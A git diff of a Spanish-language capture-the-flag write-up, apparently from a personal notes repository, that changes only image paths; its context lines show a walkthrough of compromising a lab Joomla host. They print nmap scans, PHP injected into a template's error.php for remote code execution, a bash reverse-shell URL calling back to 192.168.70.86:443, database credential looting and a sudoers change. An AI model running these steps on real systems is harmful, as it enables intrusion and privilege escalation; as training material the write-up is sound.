@@ -9,7 +9,7 @@ nmap -sS -p- --min-rate 5000 -n -Pn -vvv -oN ports 172.17.0.3
 
 Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:
 
-![Pasted image 20251027014747](Hacking-repo-obs/Anexos/Pasted%20image%2020251027014747.png)
+![Pasted image 20251027014747](../../../../Anexos/Pasted%20image%2020251027014747.png)
 
 Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:
 
@@ -17,18 +17,18 @@ Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión d
 nmap -sCV --min-rate 5000 -vvv -n -Pn -p22,80 -vvv -oN version 172.17.0.2
 ```
 
-![Pasted image 20251027014758](Hacking-repo-obs/Anexos/Pasted%20image%2020251027014758.png)
+![Pasted image 20251027014758](../../../../Anexos/Pasted%20image%2020251027014758.png)
 
 No encontramos nada interesante, así que vamos a echar un vistazo al servicio web:
 
-![Pasted image 20251027032821](Hacking-repo-obs/Anexos/Pasted%20image%2020251027032821.png)
+![Pasted image 20251027032821](../../../../Anexos/Pasted%20image%2020251027032821.png)
 
 Hacemos fuzzing, y entre otras cosas, nos encontramos con un robots.txt:
 
-![Pasted image 20251027032922](Hacking-repo-obs/Anexos/Pasted%20image%2020251027032922.png)
+![Pasted image 20251027032922](../../../../Anexos/Pasted%20image%2020251027032922.png)
 
 
-![Pasted image 20251027032707](Hacking-repo-obs/Anexos/Pasted%20image%2020251027032707.png)
+![Pasted image 20251027032707](../../../../Anexos/Pasted%20image%2020251027032707.png)
 
 Encontramos una credencial de admin:
 
@@ -42,11 +42,11 @@ No podemos acceder ni hacer nada con la contraseña, así que podemos probar cos
 echo "c2FubHVpczEyMzQ1" | base64 -d
 ```
 
-![Pasted image 20251027034105](Hacking-repo-obs/Anexos/Pasted%20image%2020251027034105.png)
+![Pasted image 20251027034105](../../../../Anexos/Pasted%20image%2020251027034105.png)
 
-![Pasted image 20251027045946](Hacking-repo-obs/Anexos/Pasted%20image%2020251027045946.png)
+![Pasted image 20251027045946](../../../../Anexos/Pasted%20image%2020251027045946.png)
 
-![Pasted image 20251027050118](Hacking-repo-obs/Anexos/Pasted%20image%2020251027050118.png)
+![Pasted image 20251027050118](../../../../Anexos/Pasted%20image%2020251027050118.png)
 
 Tenemos una RCE gracias a incorporar ese código php en el archivo error.php. Ahora vamos a ejecutar lo siguiente para lograr una reverse shell:
 
@@ -54,13 +54,13 @@ Tenemos una RCE gracias a incorporar ese código php en el archivo error.php. Ah
 http://172.17.0.3/templates/cassiopeia/error.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.70.86/443 0>%261"
 ```
 
-![Pasted image 20251027050816](Hacking-repo-obs/Anexos/Pasted%20image%2020251027050816.png)
+![Pasted image 20251027050816](../../../../Anexos/Pasted%20image%2020251027050816.png)
 
 Vemos también que en el directorio home está el usuario luisillo.
 
 Inspeccionando joomla, veo lo siguiente en el archivo de configuración:
 
-![Pasted image 20251027052059](Hacking-repo-obs/Anexos/Pasted%20image%2020251027052059.png)
+![Pasted image 20251027052059](../../../../Anexos/Pasted%20image%2020251027052059.png)
 
 Probamos lo siguiente:
 
@@ -68,11 +68,11 @@ Probamos lo siguiente:
 mysql -u joomla_user -h localhost -p
 ```
 
-![Pasted image 20251027052305](Hacking-repo-obs/Anexos/Pasted%20image%2020251027052305.png)
+![Pasted image 20251027052305](../../../../Anexos/Pasted%20image%2020251027052305.png)
 
-![Pasted image 20251027052343](Hacking-repo-obs/Anexos/Pasted%20image%2020251027052343.png)
+![Pasted image 20251027052343](../../../../Anexos/Pasted%20image%2020251027052343.png)
 
-![Pasted image 20251027053508](Hacking-repo-obs/Anexos/Pasted%20image%2020251027053508.png)
+![Pasted image 20251027053508](../../../../Anexos/Pasted%20image%2020251027053508.png)
 
 ```bash
 $2y$10$f/d0sy442VzLXyaUhSmmOu.FBRYed2afncJFmYkuJwRwsJQoaGYbW
@@ -84,17 +84,17 @@ Esta contraseña no hemos podido ni crackearla ni acceder con ella, así que seg
 find / -user luisillo 2>/dev/null
 ```
 
-![Pasted image 20251027063031](Hacking-repo-obs/Anexos/Pasted%20image%2020251027063031.png)
+![Pasted image 20251027063031](../../../../Anexos/Pasted%20image%2020251027063031.png)
 
-![Pasted image 20251027063120](Hacking-repo-obs/Anexos/Pasted%20image%2020251027063120.png)
+![Pasted image 20251027063120](../../../../Anexos/Pasted%20image%2020251027063120.png)
 
 
-![Pasted image 20251027062947](Hacking-repo-obs/Anexos/Pasted%20image%2020251027062947.png)
+![Pasted image 20251027062947](../../../../Anexos/Pasted%20image%2020251027062947.png)
 
-![Pasted image 20251027063322](Hacking-repo-obs/Anexos/Pasted%20image%2020251027063322.png)
+![Pasted image 20251027063322](../../../../Anexos/Pasted%20image%2020251027063322.png)
 
 Vamos a añadir a luisillo al fichero sudoers con todos los permisos:
 
-![Pasted image 20251027070006](Hacking-repo-obs/Anexos/Pasted%20image%2020251027070006.png)
+![Pasted image 20251027070006](../../../../Anexos/Pasted%20image%2020251027070006.png)
 
 
